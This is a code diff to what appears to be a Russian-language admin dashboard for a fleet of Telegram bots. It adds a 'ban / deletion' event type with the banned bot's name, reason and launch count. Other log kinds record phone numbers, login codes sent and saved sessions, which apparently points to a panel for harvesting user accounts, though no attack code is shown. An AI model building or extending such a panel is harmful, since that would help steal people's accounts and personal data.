@@ -365,7 +365,7 @@
       <div class="title" id="screen-title">Панель</div>
       <div class="sub" id="screen-sub"></div>
     </div>
-    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.done-btn</div>
+    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.bans</div>
   </div>
 
   <main id="content"></main>
@@ -2422,6 +2422,7 @@ const LOG_KINDS = {
   auth:    {label: 'Авторизация',      color: 'var(--ok)',     icon: '✓'},
   session: {label: 'Сохранена сессия', color: 'var(--warn)',   icon: '⛁'},
   contact: {label: 'Отправил контакт', color: 'var(--accent)', icon: '☏'},
+  ban:     {label: 'Бан / удаление',   color: 'var(--err)',    icon: '🚫'},
 };
 const AUTH_EVENT_LABELS = {
   code_sent:     'Получил код',
@@ -2464,10 +2465,22 @@ function renderLogsScreen(data){
       const meta = LOG_KINDS[it.kind] || {color:'var(--muted)', icon:'•'};
       const label = _logEventLabel(it);
       const time = _timeAgo(it.ts);
-      const botName = it.bot_username ? esc(it.bot_username.replace('@','')) : '?';
-      const userChip = it.user_id
-        ? `<span class="logchip user" data-user="${it.user_id}" data-username="${esc(it.username||'')}">👤 ${esc(it.username ? '@'+it.username : 'id'+it.user_id)}</span>`
-        : (it.phone ? `<span class="logchip">☏ ${esc(it.phone)}</span>` : '');
+
+      let metaRow = '';
+      if (it.kind === 'ban'){
+        const bname = (it.ban_bot_username || '?').replace('@','');
+        const reason = it.event ? `<span class="logchip" style="color:var(--err)">${esc(it.event)}</span>` : '';
+        const total = it.ban_launches_total
+          ? `<span class="logchip">👀 запусков: ${it.ban_launches_total}</span>` : '';
+        metaRow = `<span class="logchip" style="color:var(--err)">@${esc(bname)} · удалён</span>${reason}${total}`;
+      } else {
+        const botName = it.bot_username ? esc(it.bot_username.replace('@','')) : '?';
+        const userChip = it.user_id
+          ? `<span class="logchip user" data-user="${it.user_id}" data-username="${esc(it.username||'')}">👤 ${esc(it.username ? '@'+it.username : 'id'+it.user_id)}</span>`
+          : (it.phone ? `<span class="logchip">☏ ${esc(it.phone)}</span>` : '');
+        metaRow = `<span class="logchip bot" data-bot="${it.bot_id||''}">@${botName}</span>${userChip}`;
+      }
+
       listHTML += `
         <div class="log-row">
           <div class="log-marker" style="background:${meta.color}">${esc(meta.icon)}</div>
@@ -2476,10 +2489,7 @@ function renderLogsScreen(data){
               <span class="log-label">${esc(label)}</span>
               <span class="log-time">${esc(time)}</span>
             </div>
-            <div class="log-meta">
-              <span class="logchip bot" data-bot="${it.bot_id||''}">@${botName}</span>
-              ${userChip}
-            </div>
+            <div class="log-meta">${metaRow}</div>
           </div>
         </div>`;
     }
